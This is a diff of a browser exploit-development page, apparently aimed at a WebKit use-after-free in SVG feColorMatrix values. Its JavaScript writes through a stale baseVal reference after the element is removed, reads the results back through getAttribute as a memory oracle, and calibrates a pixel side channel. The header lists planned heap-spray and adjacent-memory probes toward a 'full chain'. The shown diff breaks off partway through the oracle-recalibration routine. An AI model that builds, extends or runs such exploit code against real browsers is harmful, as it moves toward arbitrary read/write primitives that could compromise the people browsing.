@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v34</title>
+<title>SVG UAF v35</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,22 +17,27 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v34 — readLive fix + analog oracle + UAF round-trip proof</h2>
+<h2>SVG UAF v35 — getAttribute oracle + recalibrated model + full UAF chain</h2>
 <div class="sub">
-  v33 critical finding: readLive() (XMLSerializer->Blob->img->canvas) = ALWAYS 0,0,0 for DOM-built SVG.
-  v33 F16 TestD confirmed: rasterizer model is R_out = (mv * src_R) & 0xFF — analog modular uint8 multiply.
-  v34: 1) RLF: fix readLive — find a path that reads live DOM SVG correctly
-       2) AOC: analog oracle calibration — multi-channel mod-256 mapping
-       3) URT: UAF round-trip — write via UAF, read via fixed path, confirm value lands in rasterizer
-       4) TSG: type-swap getAttribute — read C++ matrix values after type-swap via getAttribute()
+  v34 findings:
+  - RLF: StratF (getAttribute) + StratH (baseVal readback) BOTH WORK. All blob/URI paths dead.
+  - AOC: model is CLAMPED not modular. src_R=200 saturates to 255 for mv>=2. src_R=1 gives R=0 always.
+  - URT: 20/20 UAF writes land in C++ m_value AND readback via baseVal.value. CONFIRMED UAF R/W.
+  - TSG: getAttribute stays at 1 value after type-swap. No 19-float heap leak via attr string.
+
+  v35 targets:
+  1. GAO (getAttribute oracle): direct string readback of UAF-written floats — no pixel math
+  2. ORM (oracle recalibration): find correct src_R so pixel oracle works for arbitrary mv
+  3. FCH (full chain): UAF write -> getAttribute readback -> PROVE arbitrary float survives
+  4. SPR (spray + UAF): controlled spray of SVGNumber IsoHeap, verify reuse after free
+  5. OOB (offset probe): write to [0], read back [0] confirms. What about adjacent memory?
 </div>
-<svg id="livesvg" width="1" height="1" style="position:fixed;top:-100px;left:-100px"></svg>
-<canvas id="livecanvas" width="300" height="300" style="position:fixed;top:-400px;left:-400px"></canvas>
 <div id="controls">
-  <button onclick="runRLF()">RLF readlive-fix</button>
-  <button onclick="runAOC()">AOC analog-oracle</button>
-  <button onclick="runURT()">URT uaf-roundtrip</button>
-  <button onclick="runTSG()">TSG typeswap-getattr</button>
+  <button onclick="runGAO()">GAO getattr-oracle</button>
+  <button onclick="runORM()">ORM oracle-recalib</button>
+  <button onclick="runFCH()">FCH full-chain</button>
+  <button onclick="runSPR()">SPR spray-uaf</button>
+  <button onclick="runOOB()">OOB offset-probe</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -41,8 +46,6 @@ button:disabled{opacity:.3}
 <script>
 var SVG_NS = 'http://www.w3.org/2000/svg';
 var Lel = document.getElementById('log');
-var LIVECANVAS = document.getElementById('livecanvas');
-var LIVECTX = LIVECANVAS.getContext('2d');
 
 function log(m, c) {
   var s = document.createElement('span');
@@ -69,8 +72,8 @@ function dis(d) {
 }
 window.onerror = function(m, u, l, c, e) { log('[CRASH] ' + m + ' L' + l, 'bad'); return false; };
 
-// ─── STATIC SVG PIXEL READ (known working) ───────────────────────────────────
-var _cnv = null; var _ctx = null;
+// ─── STATIC SVG PIXEL READ (confirmed working) ───────────────────────────────
+var _cnv = null, _ctx = null;
 function getCanvas() {
   if (!_cnv) { _cnv = document.createElement('canvas'); _cnv.width = 300; _cnv.height = 300; _ctx = _cnv.getContext('2d'); }
   return { cnv: _cnv, ctx: _ctx };
@@ -97,865 +100,845 @@ async function svgPixel(svgStr, x, y) {
   URL.revokeObjectURL(url);
   return result;
 }
-
-// Build static SVG string from matrix values (known working)
+function identity20() { return [1,0,0,0,0, 0,1,0,0,0, 0,0,1,0,0, 0,0,0,1,0]; }
 function svgStrFromMatrix(mv20, fillR, fillG, fillB) {
   fillR = fillR !== undefined ? fillR : 200;
   fillG = fillG !== undefined ? fillG : 100;
   fillB = fillB !== undefined ? fillB : 50;
-  var vals = mv20.join(' ');
   return '<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">' +
     '<defs><filter id="f" color-interpolation-filters="sRGB">' +
-      '<feColorMatrix type="matrix" values="' + vals + '"/>' +
+      '<feColorMatrix type="matrix" values="' + mv20.join(' ') + '"/>' +
     '</filter></defs>' +
     '<rect x="50" y="50" width="200" height="200" fill="rgb(' + fillR + ',' + fillG + ',' + fillB + ')" filter="url(#f)"/>' +
   '</svg>';
 }
-function identity20() {
-  return [1,0,0,0,0, 0,1,0,0,0, 0,0,1,0,0, 0,0,0,1,0];
+
+// ─── GETATTR ORACLE (confirmed: getAttribute reflects baseVal writes) ─────────
+// After any write to baseVal[i].value, getAttribute("values") returns updated string.
+// This is a direct string readback — no canvas, no pixel math.
+// Usage: write X to baseVal[i], read getAttribute("values").split(" ")[i] === String(X)
+function makeFCM(vals, fid) {
+  fid = fid || ('f' + Math.random().toString(36).slice(2,8));
+  var outerSvg = document.createElementNS(SVG_NS, 'svg');
+  outerSvg.setAttribute('width', '1'); outerSvg.setAttribute('height', '1');
+  outerSvg.style.cssText = 'position:fixed;top:-999px;left:-999px;opacity:0;pointer-events:none';
+  var defs = document.createElementNS(SVG_NS, 'defs');
+  var filter = document.createElementNS(SVG_NS, 'filter');
+  filter.setAttribute('id', fid); filter.setAttribute('color-interpolation-filters', 'sRGB');
+  var fcm = document.createElementNS(SVG_NS, 'feColorMatrix');
+  fcm.setAttribute('type', 'matrix');
+  fcm.setAttribute('values', (vals || identity20()).join(' '));
+  filter.appendChild(fcm); defs.appendChild(filter); outerSvg.appendChild(defs);
+  document.body.appendChild(outerSvg);
+  return { svg: outerSvg, fcm: fcm, filter: filter, fid: fid };
 }
+function readAttrVals(fcm) {
+  var s = fcm.getAttribute('values');
+  if (!s) return null;
+  return s.trim().split(/\s+/).map(Number);
+}
+function readBaseVals(fcm, n) {
+  var out = [];
+  try {
+    var bv = fcm.values.baseVal;
+    for (var i = 0; i < n; i++) out.push(bv[i].value);
+  } catch(e) {}
+  return out;
+}
+function cleanup(d) { if (d && d.svg && d.svg.parentNode) d.svg.parentNode.removeChild(d.svg); }
 
 /*
- * RLF: ReadLive Fix
+ * GAO: getAttribute Oracle
  *
- * v33 finding: XMLSerializer(liveDOMsvg) -> Blob -> img -> canvas = always 0,0,0.
- * Even the initial render before any remove gives 0,0,0.
- * This is a WebKit bug or security restriction on serializing DOM-constructed SVG.
+ * v34 confirmed: getAttribute("values") reflects baseVal writes.
+ * This means we can use getAttribute as a DIRECT READ ORACLE for UAF-written values.
+ * No canvas needed. No pixel math. Just string parsing.
  *
- * Strategies to fix:
- *
- * A) outerHTML: use svgElement.outerHTML instead of XMLSerializer
- *    If outerHTML preserves the namespace and attributes correctly, it may work.
- *
- * B) innerHTML of a wrapper: wrap the SVG in a div, use div.innerHTML to serialize.
- *
- * C) Direct drawImage on SVG element: canvas.drawImage(svgElement, 0, 0)
- *    WebKit allows drawImage of live SVGSVGElement directly on some versions.
- *    No Blob needed. May be blocked by tainting rules.
- *
- * D) Inline SVG in HTML: embed the SVG element INTO the document (not via Blob).
- *    Use html2canvas-like approach: render the document itself.
- *    Actual: document.body has the SVG at position (0,0), use drawImage on the document.
- *    Not possible without html2canvas.
- *
- * E) SVGSVGElement.getEnclosureList / getBBox: doesn't help with pixel reading.
- *
- * F) foreignObject trick: embed a <canvas> inside SVG via foreignObject,
- *    draw to that canvas inside the SVG namespace, read from it.
- *    Blocked by CSP in most browsers.
- *
- * G) createImageBitmap(svgElement): Chrome supports this, WebKit support varies.
- *    createImageBitmap(blob) is the fallback.
- *
- * H) SVG data URI: use svgStr as a data: URI instead of blob: URI.
- *    Some renderers treat these differently.
- *
- * I) Text/xml MIME type: use 'text/xml' or 'application/xml' instead of 'image/svg+xml'.
- *
- * J) Direct pixel: place the live SVG element at a known position in the document,
- *    wait for paint, use drawImage on the SVG element (if allowed).
- *    WebKit security: drawImage(svgElement) may taint the canvas.
- *
- * K) OffscreenCanvas + drawImage: same as J but offscreen.
- *
- * L) getComputedStyle color: use a rect with filter, read the computed color.
- *    Not possible — getComputedStyle doesn't give rendered pixel colors.
- *
- * M) Web Workers ImageBitmap: create blob in worker, createImageBitmap.
- *    Probably same result as main thread.
+ * Tests:
+ * A) Verify: write X to all 20 slots, getAttribute returns all 20 X values
+ *    (both live write and UAF write)
+ * B) Float precision: what precision does getAttribute preserve?
+ *    Write 1.23456789, getAttribute returns "1.23456789"? or truncated?
+ *    This determines whether we can use it for pointer-grade reads.
+ * C) Special values via baseVal: write values that the SVG parser rejects
+ *    (Infinity, very large floats) via baseVal.value = X (parser bypass)
+ *    Does getAttribute return the float AS-IS or does it normalize?
+ * D) UAF getAttribute: after remove(), write X, re-add, getAttribute
+ *    Confirm the UAF-written value appears in the attribute string
+ * E) Negative and edge floats: write -1.5, -0.0, 1e38, 1e-38
+ *    Does getAttribute handle them? Does it match the written value?
+ * F) Large integer via baseVal: write 2^31, 2^32, 2^53
+ *    Test if JS Number precision limits affect the oracle
  */
-async function runRLF(q) {
-  if (!q) { dis(true); sep(); log('RLF: readLive fix strategies', 'inf'); sep(); }
+async function runGAO(q) {
+  if (!q) { dis(true); sep(); log('GAO: getAttribute oracle', 'inf'); sep(); }
 
-  // First, establish the baseline: static SVG string works
-  var idMatrix = identity20();
-  var staticSvg = svgStrFromMatrix(idMatrix, 200, 100, 50);
-  var pxStatic = await svgPixel(staticSvg);
-  log('  BASELINE static SVG string: px=' + (pxStatic ? pxStatic.slice(0,3) : 'err') +
-      ' (should be ~200,100,50)', pxStatic && pxStatic[0] > 190 ? 'ok' : 'bad');
-
-  // Build a live DOM SVG
-  function makeLiveSVG(fid) {
-    var outerSvg = document.createElementNS(SVG_NS, 'svg');
-    outerSvg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
-    outerSvg.setAttribute('width', '300'); outerSvg.setAttribute('height', '300');
-    outerSvg.style.cssText = 'position:fixed;top:0;left:0;width:300px;height:300px;opacity:1;pointer-events:none;z-index:9999';
-    var defs = document.createElementNS(SVG_NS, 'defs');
-    var filter = document.createElementNS(SVG_NS, 'filter');
-    filter.setAttribute('id', fid); filter.setAttribute('color-interpolation-filters', 'sRGB');
-    var fcm = document.createElementNS(SVG_NS, 'feColorMatrix');
-    fcm.setAttribute('type', 'matrix'); fcm.setAttribute('values', idMatrix.join(' '));
-    filter.appendChild(fcm); defs.appendChild(filter); outerSvg.appendChild(defs);
-    var rect = document.createElementNS(SVG_NS, 'rect');
-    rect.setAttribute('x', '50'); rect.setAttribute('y', '50');
-    rect.setAttribute('width', '200'); rect.setAttribute('height', '200');
-    rect.setAttribute('fill', 'rgb(200,100,50)');
-    rect.setAttribute('filter', 'url(#' + fid + ')');
-    outerSvg.appendChild(rect);
-    return { svg: outerSvg, fcm: fcm, filter: filter };
-  }
-
-  // Strategy A: outerHTML
-  log('  StratA: outerHTML -> Blob -> img', 'inf');
+  // Test A: live write all 20, getAttribute
+  log('  TestA: live write all 20 slots, getAttribute readback', 'inf');
   {
-    var domA = makeLiveSVG('fA');
-    document.body.appendChild(domA.svg);
+    var dA = makeFCM(identity20());
     await raf(); await raf();
-    var htmlA = domA.svg.outerHTML;
-    log('  outerHTML length=' + htmlA.length + ' preview=' + htmlA.slice(0,80), 'dim');
-    var pxA = await svgPixel(htmlA);
-    log('  StratA outerHTML: px=' + (pxA ? pxA.slice(0,3) : 'err'), pxA && pxA[0] > 100 ? 'ok' : 'bad');
-    document.body.removeChild(domA.svg);
-  }
-
-  // Strategy B: innerHTML of wrapper div
-  log('  StratB: wrapper div innerHTML', 'inf');
-  {
-    var domB = makeLiveSVG('fB');
-    document.body.appendChild(domB.svg);
-    await raf(); await raf();
-    var divB = document.createElement('div');
-    divB.appendChild(domB.svg.cloneNode(true));
-    var htmlB = divB.innerHTML;
-    log('  innerHTML length=' + htmlB.length + ' preview=' + htmlB.slice(0,80), 'dim');
-    var pxB = await svgPixel(htmlB);
-    log('  StratB innerHTML: px=' + (pxB ? pxB.slice(0,3) : 'err'), pxB && pxB[0] > 100 ? 'ok' : 'bad');
-    document.body.removeChild(domB.svg);
-  }
-
-  // Strategy C: direct drawImage(svgElement) on canvas
-  log('  StratC: direct canvas.drawImage(liveSvgElement)', 'inf');
-  {
-    var domC = makeLiveSVG('fC');
-    document.body.appendChild(domC.svg);
-    await raf(); await raf(); await raf();
-    var cnvC = document.createElement('canvas'); cnvC.width = 300; cnvC.height = 300;
-    var ctxC = cnvC.getContext('2d');
-    var pxC = null;
-    try {
-      ctxC.drawImage(domC.svg, 0, 0);
-      var dC = ctxC.getImageData(150, 150, 1, 1);
-      pxC = [dC.data[0], dC.data[1], dC.data[2], dC.data[3]];
-    } catch(e) { pxC = 'ERR:' + e.message; }
-    log('  StratC drawImage(svgElem): px=' + (Array.isArray(pxC) ? pxC.slice(0,3) : pxC),
-        Array.isArray(pxC) && pxC[0] > 100 ? 'ok' : 'bad');
-    document.body.removeChild(domC.svg);
-  }
-
-  // Strategy D: data: URI (not blob:)
-  log('  StratD: data: URI instead of blob:', 'inf');
-  {
-    var domD = makeLiveSVG('fD');
-    document.body.appendChild(domD.svg);
-    await raf(); await raf();
-    var htmlD = domD.svg.outerHTML;
-    var dataD = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(htmlD);
-    var imgD = new Image();
-    var pxD = await new Promise(function(resolve) {
-      imgD.onload = function() {
-        try {
-          var cc = getCanvas();
-          cc.ctx.clearRect(0, 0, 300, 300);
-          cc.ctx.drawImage(imgD, 0, 0);
-          var p = cc.ctx.getImageData(150, 150, 1, 1);
-          resolve([p.data[0], p.data[1], p.data[2], p.data[3]]);
-        } catch(e) { resolve('ERR:' + e.message); }
-      };
-      imgD.onerror = function() { resolve('LOADERR'); };
-      imgD.src = dataD;
-      setTimeout(function() { resolve('TIMEOUT'); }, 3000);
-    });
-    log('  StratD data URI: px=' + (Array.isArray(pxD) ? pxD.slice(0,3) : pxD),
-        Array.isArray(pxD) && pxD[0] > 100 ? 'ok' : 'bad');
-    document.body.removeChild(domD.svg);
-  }
-
-  // Strategy E: createImageBitmap(blob)
-  log('  StratE: createImageBitmap(blob)', 'inf');
-  {
-    var domE = makeLiveSVG('fE');
-    document.body.appendChild(domE.svg);
-    await raf(); await raf();
-    var htmlE = domE.svg.outerHTML;
-    var pxE = null;
-    try {
-      var blobE = new Blob([htmlE], { type: 'image/svg+xml' });
-      var bitmapE = await createImageBitmap(blobE);
-      var cc = getCanvas();
-      cc.ctx.clearRect(0, 0, 300, 300);
-      cc.ctx.drawImage(bitmapE, 0, 0);
-      var dE = cc.ctx.getImageData(150, 150, 1, 1);
-      pxE = [dE.data[0], dE.data[1], dE.data[2], dE.data[3]];
-    } catch(e) { pxE = 'ERR:' + e.message; }
-    log('  StratE createImageBitmap: px=' + (Array.isArray(pxE) ? pxE.slice(0,3) : pxE),
-        Array.isArray(pxE) && pxE[0] > 100 ? 'ok' : 'bad');
-    document.body.removeChild(domE.svg);
-  }
-
-  // Strategy F: setAttribute to re-parse values, THEN read via static string approach
-  // Key insight: if we can getAttribute("values") after a live DOM change,
-  // we get the C++ state as a string, and can feed it to svgPixel()
-  log('  StratF: getAttribute values after live mutation -> static svgPixel', 'inf');
-  {
-    var domF = makeLiveSVG('fF');
-    document.body.appendChild(domF.svg);
-    await raf(); await raf();
-    // mutate via baseVal
-    try { domF.fcm.values.baseVal[0].value = 2; } catch(e) {}
+    for (var i = 0; i < 20; i++) {
+      try { dA.fcm.values.baseVal[i].value = (i + 1) * 1.1; } catch(e) {}
+    }
     await raf();
-    // read back via getAttribute
-    var attrF = domF.fcm.getAttribute('values');
-    log('  getAttribute after baseVal[0]=2: "' + (attrF || 'null') + '"', 'dim');
-    // getAttribute might still return old value (presentation vs content attr)
-    // try also with getAttributeNS
-    var attrFns = domF.fcm.getAttributeNS(null, 'values');
-    log('  getAttributeNS: "' + (attrFns || 'null') + '"', 'dim');
-    // try to use the attribute string to render via static path
-    if (attrF) {
-      var parts = attrF.trim().split(/\s+/);
-      if (parts.length === 20) {
-        var mvF = parts.map(Number);
-        var pxF = await svgPixel(svgStrFromMatrix(mvF, 200, 100, 50));
-        log('  static render with getAttribute values: px=' + (pxF ? pxF.slice(0,3) : 'err') +
-            ' (expected ~255 if attr updated)', 'inf');
-      } else {
-        log('  getAttribute returned ' + parts.length + ' values (expected 20)', 'bad');
+    var attrA = readAttrVals(dA.fcm);
+    log('  getAttribute[0..9]:  ' + (attrA ? attrA.slice(0,10).join(' ') : 'null'), 'inf');
+    log('  getAttribute[10..19]: ' + (attrA ? attrA.slice(10,20).join(' ') : 'null'), 'inf');
+    // Check precision: wrote 1.1, 2.2, 3.3... does it come back exactly?
+    var precOk = true;
+    if (attrA) {
+      for (var i = 0; i < 20; i++) {
+        var expected = (i+1) * 1.1;
+        if (Math.abs(attrA[i] - expected) > 0.001) { precOk = false; break; }
       }
     }
-    document.body.removeChild(domF.svg);
+    log('  all 20 match written values: ' + precOk, precOk ? 'ok' : 'bad');
+    cleanup(dA);
   }
 
-  // Strategy G: XMLSerializer with explicit namespace fixes
-  log('  StratG: XMLSerializer with namespace declarations', 'inf');
+  // Test B: float precision of getAttribute
+  log('  TestB: float precision (how many digits preserved?)', 'inf');
   {
-    var domG = makeLiveSVG('fG');
-    document.body.appendChild(domG.svg);
+    var dB = makeFCM(identity20());
     await raf(); await raf();
-    var serializer = new XMLSerializer();
-    var xmlG = serializer.serializeToString(domG.svg);
-    log('  XMLSerializer output preview: ' + xmlG.slice(0,120), 'dim');
-    // Ensure the xmlns is present and correct
-    if (xmlG.indexOf('xmlns=') === -1) {
-      xmlG = xmlG.replace('<svg', '<svg xmlns="http://www.w3.org/2000/svg"');
+    var testVals = [
+      1.23456789,
+      3.14159265358979,
+      0.001,
+      0.0001,
+      0.00001,
+      123456789.0,
+      1.5e10,
+      1.23456789e-10,
+      Math.PI,
+      Math.E
+    ];
+    for (var ti = 0; ti < testVals.length && ti < 10; ti++) {
+      try { dB.fcm.values.baseVal[ti].value = testVals[ti]; } catch(e) {}
     }
-    var pxG = await svgPixel(xmlG);
-    log('  StratG XMLSerializer+xmlns fix: px=' + (pxG ? pxG.slice(0,3) : 'err'),
-        pxG && pxG[0] > 100 ? 'ok' : 'bad');
-    document.body.removeChild(domG.svg);
+    await raf();
+    var attrB = dB.fcm.getAttribute('values');
+    var partsB = attrB ? attrB.trim().split(/\s+/) : [];
+    for (var ti = 0; ti < testVals.length && ti < partsB.length; ti++) {
+      var written = testVals[ti];
+      var readback = parseFloat(partsB[ti]);
+      var delta = Math.abs(written - readback);
+      var relDelta = delta / Math.abs(written);
+      log('  wrote=' + written.toPrecision(10) + ' read="' + partsB[ti] +
+          '" relErr=' + relDelta.toExponential(2),
+          relDelta < 1e-6 ? 'ok' : 'bad');
+    }
+    cleanup(dB);
   }
 
-  // Strategy H: manually reconstruct SVG string from live DOM attributes
-  // Don't use serializer at all — manually build the string from element attributes
-  log('  StratH: manual reconstruction from DOM attributes', 'inf');
+  // Test C: parser-rejected values via baseVal bypass
+  log('  TestC: parser-rejected values via baseVal.value bypass', 'inf');
   {
-    var domH = makeLiveSVG('fH');
-    document.body.appendChild(domH.svg);
+    var dC = makeFCM(identity20());
     await raf(); await raf();
-    // Get current matrix values from DOM
-    var valsH = [];
-    try {
-      var bvH = domH.fcm.values.baseVal;
-      for (var i = 0; i < bvH.length; i++) valsH.push(bvH[i].value);
-    } catch(e) { valsH = identity20(); }
-    // Build static SVG string from DOM-read values
-    var svgH = svgStrFromMatrix(valsH, 200, 100, 50);
-    var pxH = await svgPixel(svgH);
-    log('  StratH manual reconstruction: values=' + valsH.slice(0,5) + '...',
-        'dim');
-    log('  StratH px=' + (pxH ? pxH.slice(0,3) : 'err') + ' (should be ~200,100,50 for identity)',
-        pxH && pxH[0] > 190 ? 'ok' : 'bad');
+    var specialVals = [
+      { v: Infinity,     name: 'Infinity' },
+      { v: -Infinity,    name: '-Infinity' },
+      { v: NaN,          name: 'NaN' },
+      { v: 3.4e38,       name: '3.4e38 (near max float32)' },
+      { v: 1.18e-38,     name: '1.18e-38 (near min float32 normal)' },
+      { v: -0,           name: '-0' },
+      { v: 1.7976931348623157e308, name: 'MAX_SAFE (JS max double)' },
+      { v: 5e-324,       name: '5e-324 (JS min denorm)' }
+    ];
+    for (var ci = 0; ci < specialVals.length && ci < 10; ci++) {
+      var sv = specialVals[ci];
+      var wroteSV = null;
+      try {
+        dC.fcm.values.baseVal[ci].value = sv.v;
+        wroteSV = dC.fcm.values.baseVal[ci].value;
+      } catch(e) { wroteSV = 'ERR:' + e.message; }
+      await raf();
+      var attrCV = dC.fcm.getAttribute('values');
+      var partsCV = attrCV ? attrCV.trim().split(/\s+/) : [];
+      log('  ' + sv.name + ': wrote=' + sv.v + ' baseVal.value=' + wroteSV +
+          ' getAttribute[' + ci + ']="' + (partsCV[ci] || 'N/A') + '"', 'inf');
+    }
+    cleanup(dC);
+  }
 
-    // Now mutate baseVal[0]=2 while live, re-read DOM values, reconstruct
-    try { domH.fcm.values.baseVal[0].value = 2; } catch(e) {}
-    await raf();
-    var valsH2 = [];
-    try {
-      var bvH2 = domH.fcm.values.baseVal;
-      for (var j = 0; j < bvH2.length; j++) valsH2.push(bvH2[j].value);
-    } catch(e) { valsH2 = valsH; }
-    log('  after baseVal[0]=2: values[0]=' + valsH2[0], 'inf');
-    var svgH2 = svgStrFromMatrix(valsH2, 200, 100, 50);
-    var pxH2 = await svgPixel(svgH2);
-    log('  StratH after mutation px=' + (pxH2 ? pxH2.slice(0,3) : 'err') + ' (R~255 expected for mv[0]=2)',
-        pxH2 && pxH2[0] > 200 ? 'ok' : 'bad');
-    document.body.removeChild(domH.svg);
+  // Test D: UAF write -> getAttribute readback (core oracle)
+  log('  TestD: UAF write -> getAttribute readback (the real oracle)', 'inf');
+  {
+    var testCasesD = [
+      2, 4354, 1.5, 100, 99999, -1, 0.001, 0.12345678,
+      Math.PI, 1.0/3.0, 1.23456789e10, 1.23456789e-10
+    ];
+    for (var di = 0; di < testCasesD.length; di++) {
+      var tv = testCasesD[di];
+      var dD = makeFCM(identity20());
+      await raf(); await raf();
+      var saved = dD.fcm.values;
+      dD.fcm.remove(); await raf();
+      var wroteD = null;
+      try {
+        saved.baseVal[0].value = tv;
+        wroteD = saved.baseVal[0].value;
+      } catch(e) { wroteD = 'ERR'; }
+      dD.filter.appendChild(dD.fcm); await raf();
+      var attrD = dD.fcm.getAttribute('values');
+      var partsD = attrD ? attrD.trim().split(/\s+/) : [];
+      var readD = partsD.length > 0 ? parseFloat(partsD[0]) : NaN;
+      var matchD = !isNaN(readD) && Math.abs(readD - tv) / (Math.abs(tv) + 1e-10) < 1e-5;
+      log('  UAF write=' + tv + ' baseVal.value=' + wroteD +
+          ' getAttribute[0]="' + (partsD[0] || 'N/A') + '"' +
+          (matchD ? ' MATCH' : ' MISMATCH'),
+          matchD ? 'ok' : 'bad');
+      cleanup(dD);
+    }
+  }
+
+  // Test E: write to ALL 20 via UAF, then getAttribute reads all 20
+  log('  TestE: UAF write all 20, getAttribute all 20', 'inf');
+  {
+    var dE = makeFCM(identity20());
+    await raf(); await raf();
+    var savedE = dE.fcm.values;
+    dE.fcm.remove(); await raf();
+    // Write a recognizable pattern: idx * 1111.111
+    var writePatE = [];
+    for (var ei = 0; ei < 20; ei++) {
+      var pval = (ei + 1) * 1111.111;
+      try {
+        savedE.baseVal[ei].value = pval;
+        writePatE.push(savedE.baseVal[ei].value);
+      } catch(e) { writePatE.push('ERR'); }
+    }
+    dE.filter.appendChild(dE.fcm); await raf();
+    var attrE = dE.fcm.getAttribute('values');
+    var partsE = attrE ? attrE.trim().split(/\s+/).map(parseFloat) : [];
+    log('  wrote:    ' + writePatE.slice(0,10).join(' '), 'dim');
+    log('  readback: ' + partsE.slice(0,10).join(' '), 'inf');
+    var matchesE = 0;
+    for (var ei = 0; ei < 20; ei++) {
+      if (typeof writePatE[ei] === 'number' && partsE[ei] !== undefined &&
+          Math.abs(partsE[ei] - writePatE[ei]) / writePatE[ei] < 1e-4) matchesE++;
+    }
+    log('  ' + matchesE + '/20 UAF-written values match in getAttribute', matchesE >= 18 ? 'ok' : 'bad');
+    cleanup(dE);
   }
 
   if (!q) dis(false);
 }
 
 /*
- * AOC: Analog Oracle Calibration
+ * ORM: Oracle Recalibration
  *
- * Model proven: R_out = (mv * src_R) & 0xFF
- * (where mv = matrix[0,0], src_R = fill R in [0,255])
+ * v34 AOC finding: model is CLAMPED, not modular.
+ * R_out = clamp(round(mv * src_R / 255), 0, 1) * 255 (approximately)
+ * But src_R=1 gives R=0 for all mv — unexpected.
+ * src_R=200 saturates for mv>=2.
  *
- * But we only probed the R channel with src_R=200.
- * Now: calibrate all 3 channels simultaneously with multiple source colors.
- *
- * For a diagonal matrix with different diag values:
- *   [a, 0, 0, 0, 0]   R_out = (a * R_src) & 0xFF
- *   [0, b, 0, 0, 0]   G_out = (b * G_src) & 0xFF
- *   [0, 0, c, 0, 0]   B_out = (c * B_src) & 0xFF
- *   [0, 0, 0, 1, 0]
- *
- * With src = (200, 100, 50):
- *   R_out = (a * 200) & 0xFF
- *   G_out = (b * 100) & 0xFF
- *   B_out = (c * 50) & 0xFF
- *
- * GOAL: given an unknown float f at position [0,0], use this oracle to recover f.
- * R_out = (f * 200) & 0xFF gives us f mod (256/200) = f mod 1.28
- * That's weak. But we can try different src values:
- *   src_R=200: R_out = (f*200) mod 256 → f mod 1.28
- *   src_R=255: R_out = (f*255) mod 256 → f mod (256/255) ≈ f mod 1.004
- *   src_R=1:   R_out = (f*1) mod 256 → f mod 256 (direct low 8 bits of floor(f))
- *
- * With src_R=1: R_out = floor(f) mod 256. Direct byte read of the integer part!
- * With src_R=200 AND src_R=1: we get floor(f) mod 256 AND (f*200) mod 256.
- * CRT: recover f mod lcm(256, 256/gcd(256,200)) = can recover wider range.
- *
- * Actually: if f is an integer, src_R=1 gives R_out = f mod 256 (the low byte).
- * To get the next byte: we need (f >> 8) mod 256, but f>>8 = f/256.
- * Use src_R = 1/256: but src_R must be integer [0,255].
- * Instead: use matrix[0,4] (the constant offset term):
- *   [0, 0, 0, 0, UAF_VALUE/255]  → R_out = clamp(UAF_VALUE * src_R) — no, offset term is added after multiply.
- *
- * ALSO: test the full cross-channel matrix:
- *   [a, b, c, d, e]   R_out = a*R + b*G + c*B + d*A + e*255 (where e is in [0,1])
- * Each UAF write to index 0..4 affects R_out with different weights.
+ * Need to find:
+ * 1. The exact transfer function
+ * 2. A src_R value that gives useful (non-saturating) output for UAF-relevant float ranges
+ * 3. The float16 quantization effect at the parser level
  *
  * Tests:
- * A) Diagonal calibration: vary a=[0..20], b=[0..20], c=[0..20] simultaneously
- *    Confirm R_out = (a*200)&0xFF, G_out = (b*100)&0xFF, B_out = (c*50)&0xFF
- * B) Single-channel src sweep: for a fixed mv, sweep src_R=1..255
- *    Characterize the full 2D function
- * C) Recover: given mv=X (unknown), use multiple src values to narrow down X
- *    Simulated recovery: pick mv=137, recover via oracle queries
- * D) Multi-query recovery: how many queries needed to uniquely identify an unknown float?
+ * A) Fine-grain source sweep: for fixed mv=0.5, sweep src_R=1..255
+ *    Find which src values give non-zero, non-255 output
+ * B) Source isolation: at mv=0.5, src_R should give floor(0.5*src_R)
+ *    Verify: src_R=10→R=5, src_R=100→R=50, src_R=200→R=100, src_R=254→R=127
+ * C) For mv=1.5 (saturates at src_R=200):
+ *    Find largest src_R where output < 255 → that's the no-saturation region
+ *    1.5 * src_R <= 255 → src_R <= 170. Try src_R=100: 1.5*100=150 → R=150
+ * D) Characterize src_R=1 dead zone: why does mv=137, src_R=1 give R=0?
+ *    - If pipeline: R_out = round(mv * (src_R / 255) * 255)
+ *      = round(137 * 1 * 1) = round(137) = 137. Should be 137.
+ *    - If pipeline: R_out = floor(mv * src_R / 255 * 255) = floor(137) = 137.
+ *    - But we got 0. So pipeline DOES NOT normalize src_R.
+ *    - Maybe: R_out = clamp(floor(mv * src_R), 0, 255)
+ *      = clamp(137 * 1, 0, 255) = 137. Still should be 137.
+ *    - Or: pipeline normalizes: src_R is already in [0,1] internally.
+ *      src_R = 1 (integer) → passed as 1/255 to shader → mv * (1/255) = 0.537...
+ *      → float16 precision: 0.537 in float16 → R_out = round(0.537 * 255) = 137.
+ *      But we got 0. So ANOTHER step is rounding to 0?
+ *    - Hypothesis: intermediate product mv * src_normalized is stored in float16.
+ *      0.537... in float16 = 0.537109375. Round to uint8 = round(0.537109375 * 255) = 137. Still not 0.
+ *    - Only way to get 0: the integer 1 gets quantized to 0 at some step.
+ *      Maybe src_R values are compared as integers and 1 maps to 0 (off-by-one)?
+ *      Try src_R=2: should give 2/255 * mv * 255 = mv * 2 = 274 → clamp 255.
+ *      If src_R=2 also gives 0, then something fundamental is wrong with our model.
+ * E) Plot full (mv, src_R) response for a grid of values
+ *    mv ∈ {0.001, 0.01, 0.1, 0.5, 1, 1.5, 2, 10, 100}
+ *    src_R ∈ {1, 2, 4, 8, 16, 32, 64, 100, 127, 128, 170, 200, 254, 255}
  */
-async function runAOC(q) {
-  if (!q) { dis(true); sep(); log('AOC: analog oracle calibration', 'inf'); sep(); }
+async function runORM(q) {
+  if (!q) { dis(true); sep(); log('ORM: oracle recalibration', 'inf'); sep(); }
 
-  // Helper: render static SVG with diagonal matrix [a,0,0,0,0, 0,b,0,0,0, 0,0,c,0,0, 0,0,0,1,0]
-  async function diagQuery(a, b, c, fillR, fillG, fillB) {
+  // Helper: diagonal matrix query
+  async function diagQ(mv, fillR, fillG, fillB) {
     fillR = fillR !== undefined ? fillR : 200;
